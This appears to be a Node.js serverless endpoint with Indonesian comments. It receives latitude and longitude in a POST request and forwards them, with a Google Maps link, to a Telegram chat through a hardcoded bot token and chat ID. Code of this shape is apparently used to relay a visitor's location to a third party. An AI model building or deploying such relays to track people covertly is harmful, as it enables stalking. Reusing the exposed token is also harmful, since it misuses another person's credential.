const axios = require('axios');

const TELEGRAM_BOT_TOKEN = '7674812326:AAFnB1Naa1B-c8Xr52lR3PBurKxrgmL9hO0'; // Ganti dengan token bot Telegram kamu
const USER_CHAT_ID = '6227207639'; // Ganti dengan chat ID kamu

module.exports = async (req, res) => {
  if (req.method === 'POST') {
    const { latitude, longitude } = req.body; // Ambil data latitude dan longitude dari body request

    const text = `🌍 Lokasi terdeteksi:\nLatitude: ${latitude}\nLongitude: ${longitude}\nhttps://www.google.com/maps?q=${latitude},${longitude}`;

    try {
      // Kirim pesan ke Telegram menggunakan API Telegram
      const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: USER_CHAT_ID, // ID chat pengguna yang akan menerima pesan
        text: text,
        parse_mode: 'HTML', // Gunakan format HTML untuk pesan
      });

      return res.status(200).json(response.data); // Kirim response ke klien jika berhasil
    } catch (error) {
      return res.status(500).json({ error: 'Gagal mengirim lokasi ke Telegram' }); // Kirim error jika gagal
    }
  } else {
    return res.status(405).json({ error: 'Metode tidak diizinkan' }); // Tangani request dengan metode selain POST
  }
};
